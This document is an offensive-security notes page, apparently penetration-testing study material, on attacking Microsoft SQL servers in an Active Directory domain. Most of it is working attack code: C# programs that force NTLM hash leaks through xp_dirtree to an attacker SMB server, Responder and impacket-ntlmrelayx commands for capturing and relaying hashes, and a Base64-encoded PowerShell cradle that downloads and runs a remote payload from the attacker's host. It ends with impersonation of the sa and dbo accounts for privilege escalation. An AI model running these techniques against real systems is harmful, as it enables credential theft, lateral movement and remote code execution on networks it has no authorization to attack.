---
title: Attacking MS SQL
tags:
  - breach
  - operations
  - sql
  - mssql
  - responder
  - impacket
  - relay
  - hash
  - hashing
  - smb
  - powershell
  - base64
---

## Enumeration

**Microsoft SQL (MS SQL)** servers usually listen on port 1433 and we could
easily find them with an **nmap** scan, however, if we've compromised an
unprivileged user in an Active Directory domain, we can more conduct a more
stealthy scan by querying the Domain Controller for **Service Principal Names
(SPNs)**. We can do this by invoking the following **setspn** command:

```powershell
setspn -T ${DOMAIN} -Q MSSQLSvc/*
```

## Authentication

There are two methods to authenticate to an MS SQL server:

- Using local accounts and credentials for the server
- Conducting Windows authentication via Kerberos and a **Ticket Granting Service
  (TGS)** ticket

After successfully logging in, we can perform a secondary login with either the
**sa (sysadmin)** account or the **dbo** user account. If our Windows account
isn't mapped to any accounts in the server, we're automatically assigned the
**guest** user account. Regardless, we won't be prompted for a password since
we're authenticating via Active Directory.

The following C# .NET code will authenticate to a MS SQL server, authenticating
via Active Directory, to query the current user's user information. This is
enabled by providing the `Integrated Security = True;` parameter in the
connection string for the server.

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main()
        {
            string sqlServer = "dc01.corp1.com";
            string database = "master";
            string conString = "Server = " + sqlServer +
                               "; Database = " + database +
                               "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            string querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            string rolequery = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(rolequery, con);
            reader = command.ExecuteReader();
            reader.Read();
            int role = int.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();

            rolequery = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(rolequery, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = int.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();

            con.Close();
        }
    }
}
```

## Stealing hashes

We can coerce MS SQL servers to authenticate to our SMB server, enabling us to
retrieve the **NTLMv2** or **Net-NTLM** hash for the user account hosting the MS
SQL server. We can do this by providing a **Universal Naming Convention (UNC)**
path for the **xp_dirtree** MS SQL procedure. This will cause the MS SQL server
to attempt to read from our SMB server, but first it'll attempt authentication.

We can use a tool like [Responder](https://github.com/SpiderLabs/Responder) to
respond to this request and dump the NLTMv2 or Net-NTLM hash to `stdout`. Here's
some example C# .NET code to implement this tactic:

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            string lHost = args[0];
            string sqlServer = "dc01.corp1.com";
            string database = "master";
            string conString = "Server = " + sqlServer +
                               "; Database = " + database +
                               "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            string query = $"EXEC master..xp_dirtree \"\\\\{lHost}\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
```

And we can listen and respond to incoming authentication requests by invoking
**responder** like so:

```bash
sudo responder -I ${INTERFACE_NAME}
```

### Relaying hashes

While we can use **NTLM** hashes to pass the hash to obtain code execution on
hosts where the domain user we've compromised is a local administrator, we can't
do the same for **NTLMv2** or **Net-NTLM** hashes. We can, however, relay the
hash to a different computer that the compromised user is a local administrator
on. For clarity, we can't relay the hash back to the same computer - this was
disabled by Microsoft in 2008.

Relaying **Net-NTLM** hashes against SMB is only possible if SMB signing is not
enabled, which is only enabled by default on Domain Controllers. To prepare for
the attack, we can invoke **impacket-ntlmrelayx** to relay incoming
authentication requests to a target, providing a **PowerShell** command to
execute on the target as a Local Administrator, the compromised user. Here's an
example invocation:

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${RHOST} -c "powershell -EncodedCommand ${BASE64_COMMAND}"
```

We can Base64 encode a **PowerShell** command by invoking the following:

```powershell
$lHost = ${LHOST}
$command = "(Invoke-RestMethod -Uri 'http://${lHost}/PayloadAmsi.ps1' -UseBasicParsing) | Invoke-Expression"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedText = [Convert]::ToBase64String($bytes)
```

## Escalating privileges

### Impersonation

The MS SQL `EXECUTE AS` statement allows us to impersonate users at the `LOGIN`
level with the `EXECUTE AS LOGIN` statement, and allows us to impersonate users
within a database at the `USER` level with the `EXECUTE AS USER` statement.

We can use the following C# .NET code to find logins that can be impersonated:

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main()
        {
            string sqlServer = "dc01.corp1.com";
            string database = "master";
            string conString = "Server = " + sqlServer +
                               "; Database = " + database +
                               "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            string query =
                "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();

            con.Close();
        }
    }
}
```

The following C# .NET code demonstrates how to impersonate the login of the `sa`
system administrator user:

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main()
        {
            string sqlServer = "dc01.corp1.com";
            string database = "master";
            string conString = "Server = " + sqlServer +
                               "; Database = " + database +
                               "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            string querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            string executeas = "EXECUTE AS LOGIN = 'sa';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();

            querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```

The following C# .NET code demonstrates how to impersonate the `dbo` user:

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main()
        {
            string sqlServer = "dc01.corp1.com";
            string database = "master";
            string conString = "Server = " + sqlServer +
                               "; Database = " + database +
                               "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            string querylogin = "SELECT USER_NAME();";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            string executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();

            querylogin = "SELECT USER_NAME();";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```
